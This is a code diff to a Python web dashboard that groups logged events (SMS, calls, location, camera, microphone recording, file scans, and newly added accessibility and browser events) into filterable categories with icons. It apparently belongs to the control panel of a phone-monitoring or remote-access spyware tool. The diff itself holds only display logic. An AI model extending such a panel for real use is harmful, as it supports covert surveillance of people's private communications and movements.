@@ -49,6 +49,10 @@ def get_event_category(event_type):
         return 'audio'
     elif 'file' in t or 'scan' in t or 'directory' in t:
         return 'file'
+    elif 'accessibility' in t:
+        return 'accessibility'
+    elif 'browser' in t:
+        return 'browser'
     else:
         return 'other'
 
@@ -151,8 +155,42 @@ def dashboard():
     
     for idx, event in enumerate(reversed(entries)):
         event_type = str(event.get('type', 'unknown'))
-        category = get_event_category(event_type)
-        css_class, icon = CATEGORY_META.get(category, ('other', '📋'))
+        if 'sms' in event_type.lower():
+            css_class = 'sms'
+            category = 'sms'
+            icon = '💬'
+        elif 'call' in event_type.lower():
+            css_class = 'call'
+            category = 'call'
+            icon = '📞'
+        elif 'location' in event_type.lower():
+            css_class = 'location'
+            category = 'location'
+            icon = '📍'
+        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
+            css_class = 'camera'
+            category = 'camera'
+            icon = '📸'
+        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
+            css_class = 'audio'
+            category = 'audio'
+            icon = '🎙️'
+        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
+            css_class = 'file'
+            category = 'file'
+            icon = '📁'
+        elif 'accessibility' in event_type.lower():
+            css_class = 'accessibility'
+            category = 'accessibility'
+            icon = '🔍'
+        elif 'browser' in event_type.lower():
+            css_class = 'file'
+            category = 'browser'
+            icon = '🌐'
+        else:
+            css_class = 'other'
+            category = 'other'
+            icon = '📋'
         
         # Filter check
         if active_category != 'all' and category != active_category:
@@ -233,6 +271,8 @@ def dashboard():
         ('camera', '📸 Camera', stats.get('camera', 0)),
         ('audio', '🎙️ Audio', stats.get('audio', 0)),
         ('file', '📁 Files', stats.get('file', 0)),
+        ('accessibility', '🔍 Accessibility', stats.get('accessibility', 0)),
+        ('browser', '🌐 Browser', stats.get('browser', 0)),
         ('other', '📋 Other', stats.get('other', 0)),
     ]
     
@@ -389,6 +429,7 @@ def dashboard():
         .camera {{ border-left: 4px solid #ff00ff; }}
         .audio {{ border-left: 4px solid #ff4444; }}
         .file {{ border-left: 4px solid #ff8800; }}
+        .accessibility {{ border-left: 4px solid #a855f7; }}
         .other {{ border-left: 4px solid #888888; }}
         
         .event-header {{
